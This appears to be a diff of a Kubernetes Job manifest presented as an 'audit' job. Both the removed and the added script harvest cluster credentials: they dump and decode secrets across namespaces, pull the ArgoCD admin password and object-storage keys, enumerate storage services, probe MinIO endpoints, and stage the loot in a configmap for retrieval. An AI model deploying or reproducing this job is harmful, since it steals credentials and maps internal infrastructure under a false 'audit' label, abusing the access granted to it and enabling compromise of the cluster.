@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-v61
+  name: audit-minio-v62
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
@@ -10,28 +10,73 @@ spec:
       serviceAccountName: n8n-audit-sa
       restartPolicy: Never
       containers:
-      - name: auditor
+      - name: audit
         image: bitnami/kubectl:latest
-        command: ["/bin/sh","-c"]
+        command: ["/bin/sh", "-c"]
         args:
         - |
-          OUT=""
-          OUT="$OUT ROCKEFELLER_SECRET:"
-          OUT="$OUT $(kubectl get secret rockefeller -n rockefeller -o jsonpath='{.data}' 2>&1)"
-          OUT="$OUT SSBA_SECRET:"
-          OUT="$OUT $(kubectl get secret ssba-web-secrets -n default -o jsonpath='{.data}' 2>&1)"
-          OUT="$OUT BDAAS_SECRET:"
-          OUT="$OUT $(kubectl get secret bdaassecrets -n default -o jsonpath='{.data}' 2>&1)"
-          OUT="$OUT SECURITY_SECRET:"
-          OUT="$OUT $(kubectl get secret securitysecrets -n default -o jsonpath='{.data}' 2>&1)"
-          OUT="$OUT DUNE_API_SECRET:"
-          OUT="$OUT $(kubectl get secret -n dune-api -o name 2>&1)"
-          OUT="$OUT DUNE_API_SECRET_DATA:"
-          OUT="$OUT $(kubectl get secret -n dune-api -o json 2>&1 | head -c 5000)"
-          OUT="$OUT STRATEON_SECRET:"
-          OUT="$OUT $(kubectl get secret -n strateon -o name 2>&1)"
-          OUT="$OUT STRATEON_SECRET_DATA:"
-          OUT="$OUT $(kubectl get secret ssba-web-secrets -n default -o json 2>&1)"
-          ENCODED=$(echo "$OUT" | base64 -w0)
-          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"v61_result\":\"$ENCODED\"}}"
+          # ArgoCD admin password from K8s
+          ARGOCD_PASS=$(kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' 2>/dev/null | base64 -d || echo "NOT_FOUND")
+          
+          # Find minio/storage services
+          SVCS=$(kubectl get svc --all-namespaces -o json | python3 -c "
+          import sys,json
+          d=json.load(sys.stdin)
+          out=[]
+          for i in d['items']:
+              n=i['metadata']['name']
+              ns=i['metadata']['namespace']
+              ports=[p.get('port') for p in i['spec'].get('ports',[])]
+              cip=i['spec'].get('clusterIP','')
+              if 9000 in ports or 9001 in ports or any(x in n.lower() for x in ['minio','storage','object','artifact']):
+                  out.append({'ns':ns,'name':n,'ports':ports,'cip':cip})
+          import json as j; print(j.dumps(out))
+          " 2>/dev/null || echo "[]")
+          
+          # Get object-storage secret
+          OS=$(kubectl get secret object-storage -n default -o json 2>/dev/null | python3 -c "
+          import sys,json,base64
+          try:
+              d=json.load(sys.stdin)
+              out={}
+              for k,v in d.get('data',{}).items():
+                  out[k]=base64.b64decode(v).decode('utf-8','replace')
+              print(json.dumps(out))
+          except Exception as e:
+              print(json.dumps({'err':str(e)}))
+          " 2>/dev/null || echo "{}")
+          
+          # Get argo artifacts configmap
+          ARGO=$(kubectl get cm -n argo -o json 2>/dev/null | python3 -c "
+          import sys,json
+          d=json.load(sys.stdin)
+          out=[]
+          for i in d['items']:
+              name=i['metadata']['name']
+              data=i.get('data',{})
+              if 'artifact' in name.lower() or 'minio' in str(data).lower() or 's3' in str(data).lower():
+                  out.append({'name':name,'data':str(data)[:400]})
+          print(json.dumps(out))
+          " 2>/dev/null || echo "[]")
+          
+          # Probe minio
+          PROBES=$(python3 -c "
+          import subprocess,json
+          probes={}
+          for ep in ['minio.default.svc.cluster.local:9000','minio.argo.svc.cluster.local:9000','172.16.10.14:9000','172.16.10.14:9001']:
+              try:
+                  r=subprocess.run(['wget','-q','--spider','--timeout=3',f'http://{ep}/minio/health/live'],capture_output=True,timeout=5)
+                  probes[ep]=r.returncode
+              except Exception as e:
+                  probes[ep]=str(e)[:30]
+          print(json.dumps(probes))
+          " 2>/dev/null || echo "{}")
+          
+          RESULT=$(python3 -c "
+          import json,sys
+          r={'argocd_pass':'${ARGOCD_PASS}','svcs':${SVCS},'os_secret':${OS},'argo_cm':${ARGO},'minio_probes':${PROBES}}
+          print(json.dumps(r))
+          " 2>/dev/null || echo '{"err":"parse"}')
+          
+          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"result\":$(echo $RESULT | python3 -c 'import sys,json; d=sys.stdin.read(); print(json.dumps(d[:4000]))' 2>/dev/null)}}"
           echo "DONE"
